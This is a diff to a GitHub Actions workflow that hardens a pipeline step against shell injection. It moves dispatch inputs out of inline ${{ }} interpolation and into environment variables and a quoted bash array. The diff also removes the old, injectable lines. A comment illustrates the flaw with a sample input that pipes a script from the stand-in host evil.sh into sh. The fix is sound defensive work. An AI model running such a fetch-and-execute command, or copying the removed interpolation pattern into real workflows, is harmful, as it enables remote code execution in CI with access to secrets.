@@ -62,15 +62,22 @@ jobs:
           DATABASE_URL: ${{ secrets.DATABASE_URL }}
           DATABASE_AUTH_TOKEN: ${{ secrets.DATABASE_AUTH_TOKEN }}
 
+      # Dispatch inputs reach the shell as env vars, never as `${{ }}` inside the
+      # script. Interpolation happens before bash sees the line, so a `limit` of
+      # `1; curl evil.sh | sh` would have been pasted in as a command. They are
+      # also quoted into an array rather than word-split out of one string.
       - name: Run pipeline
         run: |
           set -o pipefail
-          ARGS="run"
-          if [ "${{ inputs.dry_run }}" = "true" ]; then ARGS="$ARGS --dry-run"; fi
-          if [ -n "${{ inputs.limit }}" ]; then ARGS="$ARGS --limit ${{ inputs.limit }}"; fi
-          if [ -n "${{ inputs.chains }}" ]; then ARGS="$ARGS --chains ${{ inputs.chains }}"; fi
-          bun run apps/worker/src/cli.ts $ARGS 2>&1 | tee provenance-run.log
+          args=(run)
+          [ "$INPUT_DRY_RUN" = "true" ] && args+=(--dry-run)
+          [ -n "$INPUT_LIMIT" ] && args+=(--limit "$INPUT_LIMIT")
+          [ -n "$INPUT_CHAINS" ] && args+=(--chains "$INPUT_CHAINS")
+          bun run apps/worker/src/cli.ts "${args[@]}" 2>&1 | tee provenance-run.log
         env:
+          INPUT_DRY_RUN: ${{ inputs.dry_run }}
+          INPUT_LIMIT: ${{ inputs.limit }}
+          INPUT_CHAINS: ${{ inputs.chains }}
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
           DATABASE_URL: ${{ secrets.DATABASE_URL }}
           DATABASE_AUTH_TOKEN: ${{ secrets.DATABASE_AUTH_TOKEN }}
@@ -87,6 +94,7 @@ jobs:
           ALERT_SCORE_THRESHOLD: ${{ vars.ALERT_SCORE_THRESHOLD }}
           LLM_MODEL: ${{ vars.LLM_MODEL }}
           LLM_MAX_COST_USD_PER_RUN: ${{ vars.LLM_MAX_COST_USD_PER_RUN }}
+          LLM_MAX_WEB_SEARCHES: ${{ vars.LLM_MAX_WEB_SEARCHES }}
           PROVENANCE_CHAINS: ${{ vars.PROVENANCE_CHAINS }}
           LOG_LEVEL: ${{ vars.LOG_LEVEL }}
 
